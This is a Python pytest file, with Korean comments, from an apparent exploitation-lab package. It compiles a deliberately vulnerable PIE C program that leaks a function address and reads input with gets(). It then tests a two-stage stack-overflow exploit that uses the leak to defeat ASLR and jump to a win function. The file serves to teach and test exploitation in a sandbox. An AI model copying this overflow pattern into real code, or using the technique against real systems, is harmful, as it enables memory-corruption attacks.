"""멀티스테이지 러너: 유출을 읽고 그 값으로 2단계 payload 를 되쏜다(PIE 격파)."""

from __future__ import annotations

import platform
import shutil
import subprocess

import pytest

from pwnable_lab.payload.pack import build_overflow
from pwnable_lab.sandbox import SandboxLimits, run_two_stage

_SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}
_HAVE_GCC = shutil.which("gcc") is not None

# PIE 바이너리: win 의 런타임 주소를 무버퍼 stdout 으로 먼저 출력한 뒤 gets 로
# 오버플로를 읽는다. win 은 write 시스템콜로 출력(정렬/버퍼 이슈 없음).
_PIE_SRC = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ write(1, "PIE_WIN_OK\\n", 11); _exit(0); }
void vuln(void){ char buf[64]; gets(buf); }
int main(void){ setvbuf(stdout, 0, _IONBF, 0); printf("%p\\n", (void*)win); vuln(); return 0; }
"""


@pytest.mark.skipif(
    not (_SUPPORTED and _HAVE_GCC), reason="Linux/x86-64 + gcc 필요(실제 실행)"
)
def test_two_stage_defeats_pie(tmp_path):
    csrc = tmp_path / "pie.c"
    csrc.write_text(_PIE_SRC)
    out = tmp_path / "pie"
    subprocess.run(
        ["gcc", "-fno-stack-protector", "-pie", "-fPIE", "-o", str(out), str(csrc)],
        check=True,
        capture_output=True,
    )

    captured = {}

    def make_second(first_line: bytes) -> bytes:
        win_addr = int(first_line.strip(), 16)  # 유출된 win 런타임 주소
        captured["win"] = win_addr
        return build_overflow(72, win_addr, bits=64) + b"\n"

    observation, leaked = run_two_stage(
        str(out), make_second, limits=SandboxLimits(wall_seconds=8)
    )

    # 유출을 읽어 2단계를 구성했고, 그 주소로 win 이 실행됐다(PIE ASLR 격파).
    assert leaked.startswith(b"0x")
    assert captured["win"] > 0x1000
    assert b"PIE_WIN_OK" in observation.stdout


@pytest.mark.skipif(
    not (_SUPPORTED and _HAVE_GCC), reason="Linux/x86-64 + gcc 필요(실제 실행)"
)
def test_two_stage_no_leak_before_exit(tmp_path):
    # 아무 것도 출력하지 않고 바로 종료 → 유출 줄 없음, 2단계 미전송.
    csrc = tmp_path / "quiet.c"
    csrc.write_text("int main(void){ return 0; }\n")
    out = tmp_path / "quiet"
    subprocess.run(
        ["gcc", "-no-pie", "-o", str(out), str(csrc)], check=True, capture_output=True
    )
    _obs, leaked = run_two_stage(str(out), lambda line: b"x", limits=SandboxLimits())
    assert leaked == b""
